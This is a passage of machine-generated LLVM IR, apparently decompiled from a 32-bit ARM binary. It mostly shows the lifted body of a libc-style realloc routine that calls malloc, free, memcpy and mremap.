  %v3_1144c = add i32 %v2_1144c, 32
  %v4_1144c = inttoptr i32 %v3_1144c to i32*
  store i32 0, i32* %v4_1144c, align 4
  %v2_11450 = load i32, i32* %r4.global-to-local, align 4
  %v3_11450 = add i32 %v2_11450, 28
  %v4_11450 = inttoptr i32 %v3_11450 to i32*
  store i32 0, i32* %v4_11450, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11440, %dec_label_pc_113f4, %dec_label_pc_11430, %dec_label_pc_1141c, %dec_label_pc_113a8, %dec_label_pc_11414, %bb
  store i32 1, i32* @r1, align 4
  %v0_11460 = load i32, i32* @r5, align 4
  %v2_11460 = add i32 %v0_11460, 44
  %v3_11460 = inttoptr i32 %v2_11460 to i32*
  %v4_11460 = load i32, i32* %v3_11460, align 4
  store i32 %v4_11460, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11460)
  br label %dec_label_pc_1146c

dec_label_pc_1146c:                               ; preds = %dec_label_pc_1138c, %.thread
  %v0_1146c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_11358, i32* @r4, align 4
  store i32 %v6_11358, i32* @r5, align 4
  store i32 %v9_11358, i32* @r6, align 4
  store i32 %v12_11358, i32* @lr, align 4
  ret i32 %v0_1146c

; uselistorder directives
  uselistorder i32 %v1_11404, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_113e8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 3, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1146c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_11484(i32 %arg1) local_unnamed_addr {
dec_label_pc_11484:
  %v0_11484 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11484, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11484
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11484, %bb
  %v4_11494 = phi i32 [ %arg1, %dec_label_pc_11484 ], [ 0, %bb ]
  ret i32 %v4_11494

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11498 = load i32, i32* @r4, align 4
  %v6_11498 = load i32, i32* @r5, align 4
  %v9_11498 = load i32, i32* @r6, align 4
  %v12_11498 = load i32, i32* @r7, align 4
  %v15_11498 = load i32, i32* @r8, align 4
  %v18_11498 = load i32, i32* @sb, align 4
  %v21_11498 = load i32, i32* @sl, align 4
  %v24_11498 = load i32, i32* @fp, align 4
  %v27_11498 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_114a4 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_114a4, label %dec_label_pc_114b8, label %dec_label_pc_114c8

dec_label_pc_114b8:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_114bc = call i32 @malloc()
  store i32 %v0_114bc, i32* %r0.global-to-local, align 4
  store i32 %v0_114bc, i32* @r4, align 4
  br label %dec_label_pc_11828

dec_label_pc_114c8:                               ; preds = %entry
  %v2_114c8 = icmp eq i32 %arg2, 0
  br i1 %v2_114c8, label %dec_label_pc_114d0, label %dec_label_pc_114dc

dec_label_pc_114d0:                               ; preds = %dec_label_pc_114c8
  %v0_114d0 = call i32 @free()
  store i32 %v0_114d0, i32* %r0.global-to-local, align 4
  %v0_114d4 = load i32, i32* @r6, align 4
  store i32 %v0_114d4, i32* @r4, align 4
  br label %dec_label_pc_11828

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114c8
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_114e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 108) to i32*), align 4
  store i32 %v4_114e4, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_114e4, i32* %r2.global-to-local, align 4
  %v4_114f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 68) to i32*), align 4
  store i32 %v4_114f0, i32* %r1.global-to-local, align 4
  %v2_114f4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_114f4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_114fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_114fc)
  %v0_11508 = load i32, i32* @r4, align 4
  store i32 %v0_11508, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r1.global-to-local, align 4
  %v4_11514 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_11520.686 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11514)
  %v0_11520 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_11520, -32
  br i1 %tmp36, label %dec_label_pc_11544, label %dec_label_pc_11528

dec_label_pc_11528:                               ; preds = %dec_label_pc_114dc
  store i32 63508, i32* %r2.global-to-local, align 4
  %v0_1152c = call i32 @__aeabi_read_tp()
  store i32 %v0_1152c, i32* %r0.global-to-local, align 4
  %v3_11530 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_11530 = sext i16 %v3_11530 to i32
  store i32 %v4_11530, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1153c = add i32 %v4_11530, %v0_1152c
  %v4_1153c = inttoptr i32 %v3_1153c to i32*
  store i32 12, i32* %v4_1153c, align 4
  br label %dec_label_pc_11828

dec_label_pc_11544:                               ; preds = %dec_label_pc_114dc
  %v1_11544 = add i32 %v0_11520, 11
  store i32 %v1_11544, i32* %r0.global-to-local, align 4
  %v0_11548 = load i32, i32* @r5, align 4
  %v1_11548 = add i32 %v0_11548, -4
  %v2_11548 = inttoptr i32 %v1_11548 to i32*
  %v3_11548 = load i32, i32* %v2_11548, align 4
  store i32 %v3_11548, i32* %r2.global-to-local, align 4
  %v2_1154c = icmp ugt i32 %v1_11544, 14
  %v7_1154c = icmp eq i32 %v1_11544, 15
  %v2_11550 = xor i1 %v2_1154c, true
  %v3_11550 = or i1 %v7_1154c, %v2_11550
  br i1 %v3_11550, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_11544
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_11544, %bb
  %v2_11554 = xor i1 %v7_1154c, true
  %v3_11554 = and i1 %v2_1154c, %v2_11554
  br i1 %v3_11554, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_11554 = and i32 %v1_11544, -8
  store i32 %v5_11554, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_11558 = and i32 %v3_11548, 2
  %v2_11558 = icmp eq i32 %v1_11558, 0
  %v1_1155c = add i32 %v0_11548, -8
  store i32 %v1_1155c, i32* @sl, align 4
  %v1_11560 = and i32 %v3_11548, -4
  store i32 %v1_11560, i32* @r6, align 4
  br i1 %v2_11558, label %dec_label_pc_11568, label %dec_label_pc_11740

dec_label_pc_11568:                               ; preds = %bb29
  %v1_11568 = load i32, i32* @sb, align 4
  %v3_11568 = icmp ult i32 %v1_11560, %v1_11568
  br i1 %v3_11568, label %dec_label_pc_11574, label %bb30

bb30:                                             ; preds = %dec_label_pc_11568
  store i32 %v1_11560, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116d8

dec_label_pc_11574:                               ; preds = %dec_label_pc_11568
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1157c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_1157c, i32* %r0.global-to-local, align 4
  %v1_11580 = add i32 %v4_1157c, 44
  %v2_11580 = inttoptr i32 %v1_11580 to i32*
  %v3_11580 = load i32, i32* %v2_11580, align 4
  store i32 %v3_11580, i32* %r3.global-to-local, align 4
  %v2_11584 = add i32 %v1_11560, %v1_1155c
  store i32 %v2_11584, i32* @r4, align 4
  %v9_11588 = icmp eq i32 %v2_11584, %v3_11580
  %v1_1158c = add i32 %v2_11584, 4
  %v2_1158c = inttoptr i32 %v1_1158c to i32*
  %v3_1158c = load i32, i32* %v2_1158c, align 4
  store i32 %v3_1158c, i32* %r1.global-to-local, align 4
  br i1 %v9_11588, label %dec_label_pc_11594, label %dec_label_pc_115d0

dec_label_pc_11594:                               ; preds = %dec_label_pc_11574
  %v1_11594 = and i32 %v3_1158c, -4
  %v2_11598 = add i32 %v1_11594, %v1_11560
  store i32 %v2_11598, i32* %r1.global-to-local, align 4
  %v1_1159c = add i32 %v1_11568, 16
  store i32 %v1_1159c, i32* %r3.global-to-local, align 4
  %v3_115a0 = icmp ult i32 %v2_11598, %v1_1159c
  br i1 %v3_115a0, label %dec_label_pc_11624, label %dec_label_pc_115a8

dec_label_pc_115a8:                               ; preds = %dec_label_pc_11594
  %v2_115a8 = sub i32 %v2_11598, %v1_11568
  %v1_115ac = urem i32 %v3_11548, 2
  %v2_115b0 = add i32 %v1_11568, %v1_1155c
  store i32 %v2_115b0, i32* %r1.global-to-local, align 4
  %v2_115b4 = or i32 %v1_11568, %v1_115ac
  store i32 %v2_115b4, i32* %r2.global-to-local, align 4
  %v1_115b8 = or i32 %v2_115a8, 1
  store i32 %v1_115b8, i32* %r3.global-to-local, align 4
  store i32 %v0_11548, i32* @r4, align 4
  store i32 %v2_115b4, i32* %v2_11548, align 4
  %v0_115c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_115c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_115c4 = add i32 %v1_115c4, 44
  %v3_115c4 = inttoptr i32 %v2_115c4 to i32*
  store i32 %v0_115c4, i32* %v3_115c4, align 4
  %v0_115c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_115c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_115c8 = add i32 %v1_115c8, 4
  %v3_115c8 = inttoptr i32 %v2_115c8 to i32*
  store i32 %v0_115c8, i32* %v3_115c8, align 4
  br label %dec_label_pc_1180c

dec_label_pc_115d0:                               ; preds = %dec_label_pc_11574
  %v1_115d0 = and i32 %v3_1158c, -2
  %v2_115d4 = add i32 %v1_115d0, %v2_11584
  store i32 %v2_115d4, i32* %r3.global-to-local, align 4
  %v1_115d8 = add i32 %v2_115d4, 4
  %v2_115d8 = inttoptr i32 %v1_115d8 to i32*
  %v3_115d8 = load i32, i32* %v2_115d8, align 4
  store i32 %v3_115d8, i32* %r3.global-to-local, align 4
  %v1_115dc = urem i32 %v3_115d8, 2
  %v2_115dc = icmp eq i32 %v1_115dc, 0
  br i1 %v2_115dc, label %dec_label_pc_115e4, label %dec_label_pc_11624

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115d0
  %v1_115e4 = and i32 %v3_1158c, -4
  store i32 %v1_115e4, i32* %r3.global-to-local, align 4
  %v2_115e8 = add i32 %v1_115e4, %v1_11560
  store i32 %v2_115e8, i32* %r0.global-to-local, align 4
  %v3_115ec = icmp ult i32 %v2_115e8, %v1_11568
  br i1 %v3_115ec, label %dec_label_pc_11624, label %dec_label_pc_115f4

dec_label_pc_115f4:                               ; preds = %dec_label_pc_115e4
  %v1_115f4 = add i32 %v1_11560, %v0_11548
  %v2_115f4 = inttoptr i32 %v1_115f4 to i32*
  %v3_115f4 = load i32, i32* %v2_115f4, align 4
  store i32 %v3_115f4, i32* %r1.global-to-local, align 4
  %v1_115f8 = add i32 %v3_115f4, 12
  %v2_115f8 = inttoptr i32 %v1_115f8 to i32*
  %v3_115f8 = load i32, i32* %v2_115f8, align 4
  store i32 %v3_115f8, i32* %r3.global-to-local, align 4
  %v9_115fc = icmp eq i32 %v3_115f8, %v2_11584
  %v1_11600 = add i32 %v2_11584, 12
  %v2_11600 = inttoptr i32 %v1_11600 to i32*
  %v3_11600 = load i32, i32* %v2_11600, align 4
  store i32 %v3_11600, i32* %r2.global-to-local, align 4
  br i1 %v9_115fc, label %dec_label_pc_11608, label %dec_label_pc_11614

dec_label_pc_11608:                               ; preds = %dec_label_pc_115f4
  %v1_11608 = add i32 %v3_11600, 8
  %v2_11608 = inttoptr i32 %v1_11608 to i32*
  %v3_11608 = load i32, i32* %v2_11608, align 4
  store i32 %v3_11608, i32* %r3.global-to-local, align 4
  %v9_1160c = icmp eq i32 %v3_11608, %v2_11584
  br i1 %v9_1160c, label %dec_label_pc_11618, label %dec_label_pc_11614

dec_label_pc_11614:                               ; preds = %dec_label_pc_115f4, %dec_label_pc_11608
  %v0_11614 = call i32 @abort()
  store i32 %v0_11614, i32* %r0.global-to-local, align 4
  %v0_11618.pre = load i32, i32* @r1, align 4
  %v1_11618.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11618

dec_label_pc_11618:                               ; preds = %dec_label_pc_11608, %dec_label_pc_11614
  %v1_11618 = phi i32 [ %v3_11600, %dec_label_pc_11608 ], [ %v1_11618.pre, %dec_label_pc_11614 ]
  %v0_11618 = phi i32 [ %v3_115f4, %dec_label_pc_11608 ], [ %v0_11618.pre, %dec_label_pc_11614 ]
  %v2_11618 = add i32 %v1_11618, 8
  %v3_11618 = inttoptr i32 %v2_11618 to i32*
  store i32 %v0_11618, i32* %v3_11618, align 4
  %v0_1161c = load i32, i32* %r2.global-to-local, align 4
  %v1_1161c = load i32, i32* %r1.global-to-local, align 4
  %v2_1161c = add i32 %v1_1161c, 12
  %v3_1161c = inttoptr i32 %v2_1161c to i32*
  store i32 %v0_1161c, i32* %v3_1161c, align 4
  %v1_116d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116d8

dec_label_pc_11624:                               ; preds = %dec_label_pc_11594, %dec_label_pc_115e4, %dec_label_pc_115d0
  %v1_11624 = add i32 %v1_11568, -7
  store i32 %v1_11624, i32* @r0, align 4
  %v0_11628 = call i32 @malloc()
  store i32 %v0_11628, i32* @r0, align 4
  store i32 %v0_11628, i32* %r1.global-to-local, align 4
  %v2_1162c = icmp eq i32 %v0_11628, 0
  br i1 %v2_1162c, label %bb31, label %dec_label_pc_11638

bb31:                                             ; preds = %dec_label_pc_11624
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1180c

dec_label_pc_11638:                               ; preds = %dec_label_pc_11624
  %v1_11640.pre = load i32, i32* @r4, align 4
  %v1_11638 = add i32 %v0_11628, -4
  %v2_11638 = inttoptr i32 %v1_11638 to i32*
  %v3_11638 = load i32, i32* %v2_11638, align 4
  store i32 %v3_11638, i32* @r3, align 4
  %v1_1163c = add i32 %v0_11628, -8
  store i32 %v1_1163c, i32* @r7, align 4
  %v9_11640 = icmp eq i32 %v1_1163c, %v1_11640.pre
  br i1 %v9_11640, label %.thread2, label %dec_label_pc_11650

.thread2:                                         ; preds = %dec_label_pc_11638
  %v2_11644 = and i32 %v3_11638, -4
  store i32 %v2_11644, i32* %r3.global-to-local, align 4
  %v2_11648 = load i32, i32* @r6, align 4
  %v3_11648 = add i32 %v2_11648, %v2_11644
  store i32 %v3_11648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_116d8

dec_label_pc_11650:                               ; preds = %dec_label_pc_11638
  %v0_11650 = load i32, i32* @r6, align 4
  %v1_11650 = add i32 %v0_11650, -4
  store i32 %v1_11650, i32* @r2, align 4
  %v3_11654 = udiv i32 %v1_11650, 4
  store i32 %v3_11654, i32* @ip, align 4
  %tmp37 = and i32 %v1_11650, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_1165c = icmp ult i32 %v1_11650, 36
  %v3_1165c = or i1 %tmp38, %v2_1165c
  %v0_1166c = load i32, i32* @r5, align 4
  br i1 %v3_1165c, label %dec_label_pc_1166c, label %dec_label_pc_11660

dec_label_pc_11660:                               ; preds = %dec_label_pc_11650
  store i32 %v0_1166c, i32* @r1, align 4
  %v0_11664 = call i32 @memcpy()
  store i32 %v0_11664, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11650
  %v1_1166c = inttoptr i32 %v0_1166c to i32*
  %v2_1166c = load i32, i32* %v1_1166c, align 4
  store i32 %v2_1166c, i32* %r3.global-to-local, align 4
  %v2_11670 = inttoptr i32 %v0_11628 to i32*
  store i32 %v2_1166c, i32* %v2_11670, align 4
  %v0_11674 = load i32, i32* @r5, align 4
  %v1_11674 = add i32 %v0_11674, 4
  %v2_11674 = inttoptr i32 %v1_11674 to i32*
  %v3_11674 = load i32, i32* %v2_11674, align 4
  store i32 %v3_11674, i32* %r3.global-to-local, align 4
  %v1_11678 = load i32, i32* %r1.global-to-local, align 4
  %v2_11678 = add i32 %v1_11678, 4
  %v3_11678 = inttoptr i32 %v2_11678 to i32*
  store i32 %v3_11674, i32* %v3_11678, align 4
  %v0_1167c = load i32, i32* @r5, align 4
  %v1_1167c = add i32 %v0_1167c, 8
  %v2_1167c = inttoptr i32 %v1_1167c to i32*
  %v3_1167c = load i32, i32* %v2_1167c, align 4
  store i32 %v3_1167c, i32* %r3.global-to-local, align 4
  %v0_11680 = load i32, i32* @ip, align 4
  %v1_11684 = load i32, i32* %r1.global-to-local, align 4
  %v2_11684 = add i32 %v1_11684, 8
  %v3_11684 = inttoptr i32 %v2_11684 to i32*
  store i32 %v3_1167c, i32* %v3_11684, align 4
  %tmp39 = icmp ult i32 %v0_11680, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_1168c

dec_label_pc_1168c:                               ; preds = %dec_label_pc_1166c
  %v0_1168c = load i32, i32* @r5, align 4
  %v1_1168c = add i32 %v0_1168c, 12
  %v2_1168c = inttoptr i32 %v1_1168c to i32*
  %v3_1168c = load i32, i32* %v2_1168c, align 4
  store i32 %v3_1168c, i32* %r3.global-to-local, align 4
  %v1_11690 = load i32, i32* %r1.global-to-local, align 4
  %v2_11690 = add i32 %v1_11690, 12
  %v3_11690 = inttoptr i32 %v2_11690 to i32*
  store i32 %v3_1168c, i32* %v3_11690, align 4
  %v0_11694 = load i32, i32* @r5, align 4
  %v1_11694 = add i32 %v0_11694, 16
  %v2_11694 = inttoptr i32 %v1_11694 to i32*
  %v3_11694 = load i32, i32* %v2_11694, align 4
  store i32 %v3_11694, i32* %r3.global-to-local, align 4
  %v0_11698 = load i32, i32* @ip, align 4
  %v1_1169c = load i32, i32* %r1.global-to-local, align 4
  %v2_1169c = add i32 %v1_1169c, 16
  %v3_1169c = inttoptr i32 %v2_1169c to i32*
  store i32 %v3_11694, i32* %v3_1169c, align 4
  %tmp40 = icmp ult i32 %v0_11698, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_116a4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_1168c
  %v0_116a4 = load i32, i32* @r5, align 4
  %v1_116a4 = add i32 %v0_116a4, 20
  %v2_116a4 = inttoptr i32 %v1_116a4 to i32*
  %v3_116a4 = load i32, i32* %v2_116a4, align 4
  store i32 %v3_116a4, i32* %r3.global-to-local, align 4
  %v1_116a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_116a8 = add i32 %v1_116a8, 20
  %v3_116a8 = inttoptr i32 %v2_116a8 to i32*
  store i32 %v3_116a4, i32* %v3_116a8, align 4
  %v0_116ac = load i32, i32* @r5, align 4
  %v1_116ac = add i32 %v0_116ac, 24
  %v2_116ac = inttoptr i32 %v1_116ac to i32*
  %v3_116ac = load i32, i32* %v2_116ac, align 4
  store i32 %v3_116ac, i32* %r3.global-to-local, align 4
  %v1_116b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_116b0 = add i32 %v1_116b0, 24
  %v3_116b0 = inttoptr i32 %v2_116b0 to i32*
  store i32 %v3_116ac, i32* %v3_116b0, align 4
  %v0_116b4 = load i32, i32* @ip, align 4
  %v7_116b4 = icmp eq i32 %v0_116b4, 9
  br i1 %v7_116b4, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_116a4
  %v1_116b8 = load i32, i32* @r5, align 4
  %v2_116b8 = add i32 %v1_116b8, 28
  %v3_116b8 = inttoptr i32 %v2_116b8 to i32*
  %v4_116b8 = load i32, i32* %v3_116b8, align 4
  store i32 %v4_116b8, i32* %r3.global-to-local, align 4
  %v2_116bc = load i32, i32* %r1.global-to-local, align 4
  %v3_116bc = add i32 %v2_116bc, 28
  %v4_116bc = inttoptr i32 %v3_116bc to i32*
  store i32 %v4_116b8, i32* %v4_116bc, align 4
  %v1_116c0 = load i32, i32* @r5, align 4
  %v2_116c0 = add i32 %v1_116c0, 32
  %v3_116c0 = inttoptr i32 %v2_116c0 to i32*
  %v4_116c0 = load i32, i32* %v3_116c0, align 4
  store i32 %v4_116c0, i32* %r3.global-to-local, align 4
  %v2_116c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_116c4 = add i32 %v2_116c4, 32
  %v4_116c4 = inttoptr i32 %v3_116c4 to i32*
  store i32 %v4_116c0, i32* %v4_116c4, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_116a4, %dec_label_pc_1168c, %dec_label_pc_1166c, %dec_label_pc_11660, %bb32
  %v0_116c8 = load i32, i32* @r5, align 4
  store i32 %v0_116c8, i32* @r0, align 4
  %v0_116cc = call i32 @free()
  store i32 %v0_116cc, i32* %r0.global-to-local, align 4
  %v0_116d0 = load i32, i32* @r7, align 4
  %v1_116d0 = add i32 %v0_116d0, 8
  store i32 %v1_116d0, i32* @r4, align 4
  br label %dec_label_pc_1180c

dec_label_pc_116d8:                               ; preds = %bb30, %.thread2, %dec_label_pc_11618
  %v0_116ec = phi i32 [ %v3_11648, %.thread2 ], [ %v1_11560, %bb30 ], [ %v1_116d8.pre, %dec_label_pc_11618 ]
  %v0_116d8 = load i32, i32* @sb, align 4
  %v2_116d8 = sub i32 %v0_116ec, %v0_116d8
  store i32 %v2_116d8, i32* %r1.global-to-local, align 4
  %v0_116e0 = load i32, i32* @sl, align 4
  %v1_116e0 = add i32 %v0_116e0, 4
  %v2_116e0 = inttoptr i32 %v1_116e0 to i32*
  %v3_116e0 = load i32, i32* %v2_116e0, align 4
  %tmp41 = icmp ugt i32 %v2_116d8, 15
  %v1_11708 = urem i32 %v3_116e0, 2
  store i32 %v1_11708, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_11708, label %dec_label_pc_116e8

dec_label_pc_116e8:                               ; preds = %dec_label_pc_116d8
  %v2_116ec = or i32 %v1_11708, %v0_116ec
  store i32 %v2_116ec, i32* %r3.global-to-local, align 4
  store i32 %v2_116ec, i32* %v2_116e0, align 4
  %v0_116f4 = load i32, i32* @sl, align 4
  %v1_116f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_116f4 = add i32 %v1_116f4, %v0_116f4
  store i32 %v2_116f4, i32* %r2.global-to-local, align 4
  %v1_116f8 = add i32 %v2_116f4, 4
  %v2_116f8 = inttoptr i32 %v1_116f8 to i32*
  %v3_116f8 = load i32, i32* %v2_116f8, align 4
  %v1_116fc = or i32 %v3_116f8, 1
  store i32 %v1_116fc, i32* %r3.global-to-local, align 4
  store i32 %v1_116fc, i32* %v2_116f8, align 4
  br label %dec_label_pc_11738

dec_label_pc_11708:                               ; preds = %dec_label_pc_116d8
  %v2_1170c = add i32 %v0_116e0, %v0_116d8
  store i32 %v2_1170c, i32* %r0.global-to-local, align 4
  %v2_11710 = or i32 %v1_11708, %v0_116d8
  store i32 %v2_11710, i32* %r3.global-to-local, align 4
  %v1_11714 = or i32 %v2_116d8, 1
  store i32 %v1_11714, i32* %r2.global-to-local, align 4
  store i32 %v2_11710, i32* %v2_116e0, align 4
  %v0_1171c = load i32, i32* %r2.global-to-local, align 4
  %v1_1171c = load i32, i32* %r0.global-to-local, align 4
  %v2_1171c = add i32 %v1_1171c, 4
  %v3_1171c = inttoptr i32 %v2_1171c to i32*
  store i32 %v0_1171c, i32* %v3_1171c, align 4
  %v0_11720 = load i32, i32* %r0.global-to-local, align 4
  %v1_11720 = load i32, i32* %r1.global-to-local, align 4
  %v2_11720 = add i32 %v1_11720, %v0_11720
  store i32 %v2_11720, i32* %r2.global-to-local, align 4
  %v1_11724 = add i32 %v2_11720, 4
  %v2_11724 = inttoptr i32 %v1_11724 to i32*
  %v3_11724 = load i32, i32* %v2_11724, align 4
  %v1_11728 = or i32 %v3_11724, 1
  store i32 %v1_11728, i32* %r3.global-to-local, align 4
  store i32 %v1_11728, i32* %v2_11724, align 4
  %v0_11730 = load i32, i32* %r0.global-to-local, align 4
  %v1_11730 = add i32 %v0_11730, 8
  store i32 %v1_11730, i32* @r0, align 4
  %v0_11734 = call i32 @free()
  store i32 %v0_11734, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11738

dec_label_pc_11738:                               ; preds = %dec_label_pc_116e8, %dec_label_pc_11708
  %v0_11738 = load i32, i32* @sl, align 4
  %v1_11738 = add i32 %v0_11738, 8
  store i32 %v1_11738, i32* @r4, align 4
  br label %dec_label_pc_1180c

dec_label_pc_11740:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r1.global-to-local, align 4
  %v4_11748 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 64) to i32*), align 4
  store i32 %v4_11748, i32* @r8, align 4
  %v2_1174c = inttoptr i32 %v1_1155c to i32*
  %v3_1174c = load i32, i32* %v2_1174c, align 4
  store i32 %v3_1174c, i32* @r4, align 4
  %v1_11750 = add i32 %v4_11748, 860
  %v2_11750 = inttoptr i32 %v1_11750 to i32*
  %v3_11750 = load i32, i32* %v2_11750, align 4
  %v1_11754 = add i32 %v3_1174c, 4
  %v1_11758 = add i32 %v3_11750, -1
  store i32 %v1_11758, i32* %r2.global-to-local, align 4
  %v2_1175c = add i32 %v1_11754, %v1_11758
  %v1_11760 = load i32, i32* @sb, align 4
  %v2_11760 = add i32 %v2_1175c, %v1_11760
  store i32 %v2_11760, i32* %r3.global-to-local, align 4
  %v2_11764 = sub i32 0, %v3_11750
  %v3_11764 = and i32 %v2_11760, %v2_11764
  store i32 %v3_11764, i32* @r7, align 4
  %v2_11768 = sub i32 %v3_11764, %v3_1174c
  store i32 %v2_11768, i32* @fp, align 4
  %v9_1176c = icmp eq i32 %v1_11560, %v2_11768
  br i1 %v9_1176c, label %dec_label_pc_117e0, label %dec_label_pc_11774

dec_label_pc_11774:                               ; preds = %dec_label_pc_11740
  %v2_11774 = sub i32 %v1_1155c, %v3_1174c
  store i32 %v2_11774, i32* %r0.global-to-local, align 4
  %v2_11778 = add i32 %v3_1174c, %v1_11560
  store i32 %v2_11778, i32* %r1.global-to-local, align 4
  store i32 %v3_11764, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_11784 = call i32 @mremap(i32 %v2_11774, i32 %v2_11778, i32 %v3_11764, i32 1)
  store i32 %v4_11784, i32* %r0.global-to-local, align 4
  %v7_11788 = icmp eq i32 %v4_11784, -1
  br i1 %v7_11788, label %dec_label_pc_117d4, label %dec_label_pc_11790

dec_label_pc_11790:                               ; preds = %dec_label_pc_11774
  %v1_11790 = load i32, i32* @r4, align 4
  %v2_11790 = add i32 %v1_11790, %v4_11784
  store i32 %v2_11790, i32* %r0.global-to-local, align 4
  %v0_11794 = load i32, i32* @fp, align 4
  %v1_11794 = or i32 %v0_11794, 2
  store i32 %v1_11794, i32* %r3.global-to-local, align 4
  %v2_11798 = add i32 %v2_11790, 4
  %v3_11798 = inttoptr i32 %v2_11798 to i32*
  store i32 %v1_11794, i32* %v3_11798, align 4
  %v0_1179c = load i32, i32* @r8, align 4
  %v1_1179c = add i32 %v0_1179c, 868
  %v2_1179c = inttoptr i32 %v1_1179c to i32*
  %v3_1179c = load i32, i32* %v2_1179c, align 4
  store i32 %v3_1179c, i32* %r3.global-to-local, align 4
  %v1_117a0 = add i32 %v0_1179c, 880
  %v2_117a0 = inttoptr i32 %v1_117a0 to i32*
  %v3_117a0 = load i32, i32* %v2_117a0, align 4
  store i32 %v3_117a0, i32* %r2.global-to-local, align 4
  %v0_117a4 = load i32, i32* @r6, align 4
  %v2_117a4 = sub i32 %v3_1179c, %v0_117a4
  store i32 %v2_117a4, i32* %r3.global-to-local, align 4
  %v1_117a8 = load i32, i32* @r7, align 4
  %v2_117a8 = add i32 %v1_117a8, %v2_117a4
  store i32 %v2_117a8, i32* %r1.global-to-local, align 4
  %v1_117ac = add i32 %v0_1179c, 872
  %v2_117ac = inttoptr i32 %v1_117ac to i32*
  %v3_117ac = load i32, i32* %v2_117ac, align 4
  store i32 %v3_117ac, i32* %r3.global-to-local, align 4
  %v1_117b4 = add i32 %v0_1179c, 884
  %v2_117b4 = inttoptr i32 %v1_117b4 to i32*
